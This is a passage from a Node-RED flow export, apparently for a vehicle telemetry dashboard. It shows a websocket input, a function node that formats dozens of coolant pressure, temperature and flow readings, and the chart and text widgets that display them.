        "layout": "row-spread",
        "className": "",
        "x": 830,
        "y": 1000,
        "wires": []
    },
    {
        "id": "182ae0642a6369b0",
        "type": "ui_text",
        "z": "4a2f2f6c3794d699",
        "group": "2a5cf11e0b167099",
        "order": 2,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Total Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 830,
        "y": 1040,
        "wires": []
    },
    {
        "id": "6523f13f4e944c23",
        "type": "json",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 390,
        "y": 340,
        "wires": [
            [
                "462c713e2f67e9a5"
            ]
        ]
    },
    {
        "id": "cbac43c015739c0d",
        "type": "websocket in",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 190,
        "y": 340,
        "wires": [
            [
                "6523f13f4e944c23"
            ]
        ]
    },
    {
        "id": "9e7af11f3abadef1",
        "type": "function",
        "z": "2b8b862ad49c5254",
        "name": "MC Code",
        "func": "var sigFigs = 2\n\nvar VCU_radCoolantPressOut =\n{\n    topic: \"Radiator Coolant Pressure Out\",\n    payload: msg.payload.VCU_radCoolantPressOut\n}\ntry {\n    VCU_radCoolantPressOut.payload = VCU_radCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressIn =\n{\n    topic: \"Radiator Coolant Pressure In\",\n    payload: msg.payload.VCU_radCoolantPressIn\n}\ntry {\n    VCU_radCoolantPressIn.payload = VCU_radCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressOut =\n{\n    topic: \"Motor Coolant Pressure Out\",\n    payload: msg.payload.VCU_motorCoolantPressOut\n}\ntry {\n    VCU_motorCoolantPressOut.payload = VCU_motorCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressIn =\n{\n    topic: \"Motor Coolant Pressure In\",\n    payload: msg.payload.VCU_motorCoolantPressIn\n}\ntry {\n    VCU_motorCoolantPressIn.payload = VCU_motorCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressOut =\n{\n    topic: \"Motor Controller Coolant Pressure Out\",\n    payload: msg.payload.VCU_mcCoolantPressOut\n}\ntry {\n    VCU_mcCoolantPressOut.payload = VCU_mcCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressIn =\n{\n    topic: \"Motor Controller Pressure In\",\n    payload: msg.payload.VCU_mcCoolantPressIn\n}\ntry {\n    VCU_mcCoolantPressIn.payload = VCU_mcCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressOut =\n{\n    topic: \"Accumulator Coolant Pressure Out\",\n    payload: msg.payload.VCU_accuCoolantPressOut\n}\ntry {\n    VCU_accuCoolantPressOut.payload = VCU_accuCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressIn =\n{\n    topic: \"Accumulator Coolant Pressure In\",\n    payload: msg.payload.VCU_accuCoolantPressIn\n}\ntry {\n    VCU_accuCoolantPressIn.payload = VCU_accuCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempIn =\n{\n    topic: \"Motor Coolant Temperature In\",\n    payload: msg.payload.VCU_motorCoolantTempIn\n}\ntry {\n    VCU_motorCoolantTempIn.payload = VCU_motorCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempOut =\n{\n    topic: \"Radiator Coolant Temperature Out\",\n    payload: msg.payload.VCU_radCoolantTempOut\n}\ntry {\n    VCU_radCoolantTempOut.payload = VCU_radCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempIn =\n{\n    topic: \"Radiator Coolant Temperature In\",\n    payload: msg.payload.VCU_radCoolantTempIn\n}\ntry {\n    VCU_radCoolantTempIn.payload = VCU_radCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempOut =\n{\n    topic: \"Motor Coolant Temperature Out\",\n    payload: msg.payload.VCU_motorCoolantTempOut\n}\ntry {\n    VCU_motorCoolantTempOut.payload = VCU_motorCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempOut =\n{\n    topic: \"Motor Controller Coolant Temperature Out\",\n    payload: msg.payload.VCU_mcCoolantTempOut\n}\ntry {\n    VCU_mcCoolantTempOut.payload = VCU_mcCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempIn =\n{\n    topic: \"Motor Controller Coolant Temperature In\",\n    payload: msg.payload.VCU_mcCoolantTempIn\n}\ntry {\n    VCU_mcCoolantTempIn.payload = VCU_mcCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempOut =\n{\n    topic: \"Accumulator Coolant Temperature Out\",\n    payload: msg.payload.VCU_accuCoolantTempOut\n}\ntry {\n    VCU_accuCoolantTempOut.payload = VCU_accuCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempIn =\n{\n    topic: \"Accumulator Coolant Temperature In\",\n    payload: msg.payload.VCU_accuCoolantTempIn\n}\ntry {\n    VCU_accuCoolantTempIn.payload = VCU_accuCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_limitCoolantDerating =\n{\n    topic: \"Limit Coolant Derating\",\n    payload: msg.payload.INV_limitCoolantDerating\n}\ntry {\n    INV_limitCoolantDerating.payload = INV_limitCoolantDerating.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantFlowRateDiag =\n{\n    topic: \"Motor Controller Coolant Flow Rate Diag\",\n    payload: msg.payload.VCU_mcCoolantFlowRateDiag\n}\ntry {\n    VCU_mcCoolantFlowRateDiag.payload = VCU_mcCoolantFlowRateDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radiatorCoolantFlowRateDiag =\n{\n    topic: \"Radiator Coolant Flow Rate Diag\",\n    payload: msg.payload.VCU_radiatorCoolantFlowRateDiag\n}\ntry {\n    VCU_radiatorCoolantFlowRateDiag.payload = VCU_radiatorCoolantFlowRateDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempOutWarning =\n{\n    topic: \"Radiator Coolant Temperature Out Warning\",\n    payload: msg.payload.VCU_radCoolantTempOutWarning\n}\ntry {\n    VCU_radCoolantTempOutWarning.payload = VCU_radCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempOutDiag =\n{\n    topic: \"Radiator Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_radCoolantTempOutDiag\n}\ntry {\n    VCU_radCoolantTempOutDiag.payload = VCU_radCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempInWarning =\n{\n    topic: \"Radiator Coolant Temperature In Warning\",\n    payload: msg.payload.VCU_radCoolantTempInWarning\n}\ntry {\n    VCU_radCoolantTempInWarning.payload = VCU_radCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempInDiag =\n{\n    topic: \"Radiator Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_radCoolantTempInDiag\n}\ntry {\n    VCU_radCoolantTempInDiag.payload = VCU_radCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressOutWarning =\n{\n    topic: \"Radiator Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_radCoolantPressOutWarning\n}\ntry {\n    VCU_radCoolantPressOutWarning.payload = VCU_radCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressOutDiag =\n{\n    topic: \"Radiator Coolant Pressure Out Diag\",\n    payload: msg.payload.VCU_radCoolantPressOutDiag\n}\ntry {\n    VCU_radCoolantPressOutDiag.payload = VCU_radCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressInWarning =\n{\n    topic: \"Radiator Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_radCoolantPressInWarning\n}\ntry {\n    VCU_radCoolantPressInWarning.payload = VCU_radCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressInDiag =\n{\n    topic: \"Radiator Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_radCoolantPressInDiag\n}\ntry {\n    VCU_radCoolantPressInDiag.payload = VCU_radCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantFlowRateWarning =\n{\n    topic: \"Radiator Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_radCoolantFlowRateWarning\n}\ntry {\n    VCU_radCoolantFlowRateWarning.payload = VCU_radCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempOutWarning =\n{\n    topic: \"Motor Coolant Temperature Out Warning\",\n    payload: msg.payload.VCU_motorCoolantTempOutWarning\n}\ntry {\n    VCU_motorCoolantTempOutWarning.payload = VCU_motorCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempOutDiag =\n{\n    topic: \"Motor Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_motorCoolantTempOutDiag\n}\ntry {\n    VCU_motorCoolantTempOutDiag.payload = VCU_motorCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempInWarning =\n{\n    topic: \"Motor Coolant Temperature In Warning\",\n    payload: msg.payload.VCU_motorCoolantTempInWarning\n}\ntry {\n    VCU_motorCoolantTempInWarning.payload = VCU_motorCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempInDiag =\n{\n    topic: \"Motor Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_motorCoolantTempInDiag\n}\ntry {\n    VCU_motorCoolantTempInDiag.payload = VCU_motorCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressOutWarning =\n{\n    topic: \"Motor Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_motorCoolantPressOutWarning\n}\ntry {\n    VCU_motorCoolantPressOutWarning.payload = VCU_motorCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressOutDiag =\n{\n    topic: \"Motor Coolant Pressure Out Diag\",\n    payload: msg.payload.VCU_motorCoolantPressOutDiag\n}\ntry {\n    VCU_motorCoolantPressOutDiag.payload = VCU_motorCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressInWarning =\n{\n    topic: \"Motor Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_motorCoolantPressInWarning\n}\ntry {\n    VCU_motorCoolantPressInWarning.payload = VCU_motorCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressInDiag =\n{\n    topic: \"Motor Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_motorCoolantPressInDiag\n}\ntry {\n    VCU_motorCoolantPressInDiag.payload = VCU_motorCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantFlowRateWarning =\n{\n    topic: \"Motor Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_motorCoolantFlowRateWarning\n}\ntry {\n    VCU_motorCoolantFlowRateWarning.payload = VCU_motorCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantFlowRateDiag =\n{\n    topic: \"Motor Coolant Flow Rate Diag\",\n    payload: msg.payload.VCU_motorCoolantFlowRateDiag\n}\ntry {\n    VCU_motorCoolantFlowRateDiag.payload = VCU_motorCoolantFlowRateDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempOutWarning =\n{\n    topic: \"Motor Controller Temperature Out Warning\",\n    payload: msg.payload.VCU_mcCoolantTempOutWarning\n}\ntry {\n    VCU_mcCoolantTempOutWarning.payload = VCU_mcCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempOutDiag =\n{\n    topic: \"Motor Controller Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_mcCoolantTempOutDiag\n}\ntry {\n    VCU_mcCoolantTempOutDiag.payload = VCU_mcCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempInWarning =\n{\n    topic: \"Motor Controller Coolant Temperature In Warning\",\n    payload: msg.payload.VCU_mcCoolantTempInWarning\n}\ntry {\n    VCU_mcCoolantTempInWarning.payload = VCU_mcCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempInDiag =\n{\n    topic: \"Motor Controller Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_mcCoolantTempInDiag\n}\ntry {\n    VCU_mcCoolantTempInDiag.payload = VCU_mcCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressOutWarning =\n{\n    topic: \"Motor Controller Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_mcCoolantPressOutWarning\n}\ntry {\n    VCU_mcCoolantPressOutWarning.payload = VCU_mcCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressOutDiag =\n{\n    topic: \"Motor Controller Pressure Out Diag\",\n    payload: msg.payload.VCU_mcCoolantPressOutDiag\n}\ntry {\n    VCU_mcCoolantPressOutDiag.payload = VCU_mcCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressInWarning =\n{\n    topic: \"Motor Controller Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_mcCoolantPressInWarning\n}\ntry {\n    VCU_mcCoolantPressInWarning.payload = VCU_mcCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressInDiag =\n{\n    topic: \"Motor Controller Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_mcCoolantPressInDiag\n}\ntry {\n    VCU_mcCoolantPressInDiag.payload = VCU_mcCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantFlowRateWarning =\n{\n    topic: \"Motor Controller Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_mcCoolantFlowRateWarning\n}\ntry {\n    VCU_mcCoolantFlowRateWarning.payload = VCU_mcCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempOutWarning =\n{\n    topic: \"Accumulator Coolant Temperature Out Warning\",\n    payload: msg.payload.VCU_accuCoolantTempOutWarning\n}\ntry {\n    VCU_accuCoolantTempOutWarning.payload = VCU_accuCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempOutDiag =\n{\n    topic: \"Accumulator Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_accuCoolantTempOutDiag\n}\ntry {\n    VCU_accuCoolantTempOutDiag.payload = VCU_accuCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempInWarning =\n{\n    topic: \"Accumulator Coolant Temperature In Warning\",\n    payload: msg.payload.VCU_accuCoolantTempInWarning\n}\ntry {\n    VCU_accuCoolantTempInWarning.payload = VCU_accuCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempInDiag =\n{\n    topic: \"Accumulator Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_accuCoolantTempInDiag\n}\ntry {\n    VCU_accuCoolantTempInDiag.payload = VCU_accuCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressOutWarning =\n{\n    topic: \"Accumulator Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_accuCoolantPressOutWarning\n}\ntry {\n    VCU_accuCoolantPressOutWarning.payload = VCU_accuCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressOutDiag =\n{\n    topic: \"Accumulator Coolant Pressure Out Diag\",\n    payload: msg.payload.VCU_accuCoolantPressOutDiag\n}\ntry {\n    VCU_accuCoolantPressOutDiag.payload = VCU_accuCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressInWarning =\n{\n    topic: \"Accumulator Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_accuCoolantPressInWarning\n}\ntry {\n    VCU_accuCoolantPressInWarning.payload = VCU_accuCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressInDiag =\n{\n    topic: \"Accumulator Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_accuCoolantPressInDiag\n}\ntry {\n    VCU_accuCoolantPressInDiag.payload = VCU_accuCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantFlowRateWarning =\n{\n    topic: \"Accumulator Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_accuCoolantFlowRateWarning\n}\ntry {\n    VCU_accuCoolantFlowRateWarning.payload = VCU_accuCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantFlowRateDiag =\n{\n    topic: \"Accumulator Coolant Flow Rate Diag\",\n    payload: msg.payload.VCU_accuCoolantFlowRateDiag\n}\ntry {\n    VCU_accuCoolantFlowRateDiag.payload = VCU_accuCoolantFlowRateDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcTempCoolant =\n{\n    topic: \"Motor Controller Coolant Temperature\",\n    payload: msg.payload.VCU_mcTempCoolant\n}\ntry {\n    VCU_mcTempCoolant.payload = VCU_mcTempCoolant.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantFlowRate =\n{\n    topic: \"Motor Coolant Flow Rate\",\n    payload: msg.payload.VCU_motorCoolantFlowRate\n}\ntry {\n    VCU_motorCoolantFlowRate.payload = VCU_motorCoolantFlowRate.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantFlowRate =\n{\n    topic: \"Motor Controller Coolant Flow Rate\",\n    payload: msg.payload.VCU_mcCoolantFlowRate\n}\ntry {\n    VCU_mcCoolantFlowRate.payload = VCU_mcCoolantFlowRate.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Limit_Coolant_Derating =\n{\n    topic: \"Limit Coolant Derating\",\n    payload: msg.payload.INV_Limit_Coolant_Derating\n}\ntry {\n    INV_Limit_Coolant_Derating.payload = INV_Limit_Coolant_Derating.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Coolant_Temp =\n{\n    topic: \"Average Coolant Temperature\",\n    payload: msg.payload.INV_Coolant_Temp\n}\ntry {\n    INV_Coolant_Temp.payload = INV_Coolant_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    VCU_radCoolantPressOut,\n    VCU_radCoolantPressIn,\n    VCU_motorCoolantPressOut,\n    VCU_motorCoolantPressIn,\n    VCU_mcCoolantPressOut,\n    VCU_mcCoolantPressIn,\n    VCU_accuCoolantPressOut,\n    VCU_accuCoolantPressIn,\n    VCU_motorCoolantTempIn,\n    VCU_radCoolantTempOut,\n    VCU_radCoolantTempIn,\n    VCU_motorCoolantTempOut,\n    VCU_mcCoolantTempOut,\n    VCU_mcCoolantTempIn,\n    VCU_accuCoolantTempOut,\n    VCU_accuCoolantTempIn,\n    0,\n    VCU_mcCoolantFlowRateDiag,\n    VCU_radiatorCoolantFlowRateDiag,\n    VCU_radCoolantTempOutWarning,\n    VCU_radCoolantTempOutDiag,\n    VCU_radCoolantTempInWarning,\n    VCU_radCoolantTempInDiag,\n    VCU_radCoolantPressOutWarning,\n    VCU_radCoolantPressOutDiag,\n    VCU_radCoolantPressInWarning,\n    VCU_radCoolantPressInDiag,\n    VCU_radCoolantFlowRateWarning,\n    VCU_motorCoolantTempOutWarning,\n    VCU_motorCoolantTempOutDiag,\n    VCU_motorCoolantTempInWarning,\n    VCU_motorCoolantTempInDiag,\n    VCU_motorCoolantPressOutWarning,\n    VCU_motorCoolantPressOutDiag,\n    VCU_motorCoolantPressInWarning,\n    VCU_motorCoolantPressInDiag,\n    VCU_motorCoolantFlowRateWarning,\n    VCU_motorCoolantFlowRateDiag,\n    VCU_mcCoolantTempOutWarning,\n    VCU_mcCoolantTempOutDiag,\n    VCU_mcCoolantTempInWarning,\n    VCU_mcCoolantTempInDiag,\n    VCU_mcCoolantPressOutWarning,\n    VCU_mcCoolantPressOutDiag,\n    VCU_mcCoolantPressInWarning,\n    VCU_mcCoolantPressInDiag,\n    VCU_mcCoolantFlowRateWarning,\n    VCU_accuCoolantTempOutWarning,\n    VCU_accuCoolantTempOutDiag,\n    VCU_accuCoolantTempInWarning,\n    VCU_accuCoolantTempInDiag,\n    VCU_accuCoolantPressOutWarning,\n    VCU_accuCoolantPressOutDiag,\n    VCU_accuCoolantPressInWarning,\n    VCU_accuCoolantPressInDiag,\n    VCU_accuCoolantFlowRateWarning,\n    VCU_accuCoolantFlowRateDiag,\n    VCU_mcTempCoolant,\n    VCU_motorCoolantFlowRate,\n    VCU_mcCoolantFlowRate,\n    INV_Limit_Coolant_Derating,\n    INV_Coolant_Temp\n];",
        "outputs": 62,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 580,
        "y": 620,
        "wires": [
            [
                "fc884f64d52dffac"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "76a171510f02369e"
            ],
            [],
            [
                "d78d3a3933cb7ed1"
            ],
            [
                "d78d3a3933cb7ed1"
            ],
            [
                "adfc36119aac436f"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "d75dcda8e3c6124e"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "aa6faf686efe3275"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "9cda0b72ea438ee8"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "114ce49df49b45d8"
            ],
            [
                "ddcb8cd2f85dbc52"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "6e9f843329955e54"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "ee0b620c5caa1bd0"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "bd76826b7309a623"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "dd7cb72a11e31ce4"
            ],
            [
                "d78d3a3933cb7ed1"
            ],
            [
                "3d2fede85ed3577c"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "52c9b5f64556070b"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "2c9a71f9c9130449"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "0dc21fdc8dcf6647"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "af5dc0bdbc40aeb3"
            ],
            [
                "c72d333e294a0449"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "6c3eee03be291cde"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "a7df116e82606079"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "8393d1685de05288"
            ],
            [
                "fc884f64d52dffac"
            ],
            [
                "d78d3a3933cb7ed1",
                "e5d2fd471241621b"
            ],
            [
                "d78d3a3933cb7ed1"
            ],
            [
                "76a171510f02369e"
            ],
            [
                "d78d3a3933cb7ed1"
            ],
            [
                "d78d3a3933cb7ed1"
            ],
            [
                "63b6492d40877894"
            ],
            [
                "76a171510f02369e"
            ]
        ]
    },
    {
        "id": "fc884f64d52dffac",
        "type": "ui_chart",
        "z": "2b8b862ad49c5254",
        "name": "",
        "group": "7765e86795d3af12",
        "order": 7,
        "width": 8,
        "height": "9",
        "label": "Pressures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 900,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "76a171510f02369e",
        "type": "ui_chart",
        "z": "2b8b862ad49c5254",
        "name": "",
        "group": "744c261bf3ffa000",
        "order": 7,
        "width": 8,
        "height": "9",
        "label": "Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 920,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "d78d3a3933cb7ed1",
        "type": "ui_chart",
        "z": "2b8b862ad49c5254",
        "name": "",
        "group": "8cb0a474df46243c",
        "order": 8,
        "width": 8,
        "height": "9",
        "label": "Flow Rates",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 910,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "adfc36119aac436f",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "7765e86795d3af12",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Radiator Coolant Temperature Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 440,
        "wires": []
    },
    {
        "id": "d75dcda8e3c6124e",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "7765e86795d3af12",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Radiator Coolant Temperature In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1000,
        "y": 480,
        "wires": []
    },
    {
        "id": "ddcb8cd2f85dbc52",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "744c261bf3ffa000",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Coolant Temperature Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1000,
        "y": 600,
        "wires": []
    },
    {
        "id": "6e9f843329955e54",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "744c261bf3ffa000",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Coolant Temperature In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 990,
        "y": 640,
        "wires": []
    },
    {
        "id": "3d2fede85ed3577c",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "8cb0a474df46243c",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Controlor Coolant Temperature Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1030,
        "y": 800,
        "wires": []
    },
    {
        "id": "52c9b5f64556070b",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "8cb0a474df46243c",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Motor Controlor Coolant Temperature In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1030,
        "y": 840,
        "wires": []
    },
    {
        "id": "c72d333e294a0449",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "f52af5df60607f14",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Accumulator Coolant Temperature Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1020,
        "y": 1080,
        "wires": []
    },
    {
        "id": "6c3eee03be291cde",
        "type": "ui_text",
        "z": "2b8b862ad49c5254",
        "group": "f52af5df60607f14",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Accumulator Coolant Temperature In Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1020,
        "y": 1120,
        "wires": []
    },
    {
